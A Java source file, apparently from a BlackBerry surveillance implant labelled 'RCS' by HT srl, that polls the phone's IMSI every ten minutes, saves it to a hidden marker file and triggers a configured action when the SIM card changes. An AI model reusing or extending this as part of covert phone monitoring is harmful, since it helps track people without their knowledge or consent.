//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SimChangeEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.IOException;

import blackberry.Device;
import blackberry.log.Markup;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class SimChangeEvent.
 */
public final class SimChangeEvent extends Event {

    private static final long PERIOD = 600000;
    Markup markup;

    /**
     * Instantiates a new sim change event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public SimChangeEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_SIM_CHANGE, actionId, confParams, "SimChangeEvent");

        if (!Device.isCDMA()) {
            setPeriod(PERIOD);
        }
    }

    protected void actualStart() {
        if (!markup.isMarkup()) {
            updateImsi();
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
        byte[] imsi = Device.getInstance().getWImsi();
        byte[] saved;
        try {
            saved = markup.readMarkup();
            if (!Utils.equals(imsi, saved)) {
                updateImsi();
                trigger();
            }
        } catch (IOException e) {
            updateImsi();
        }

    }

    protected void actualStop() {

    }

    private void updateImsi() {
        markup.createEmptyMarkup();
        markup.writeMarkup(Device.getInstance().getWImsi());
    }
    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        return true;
    }

}
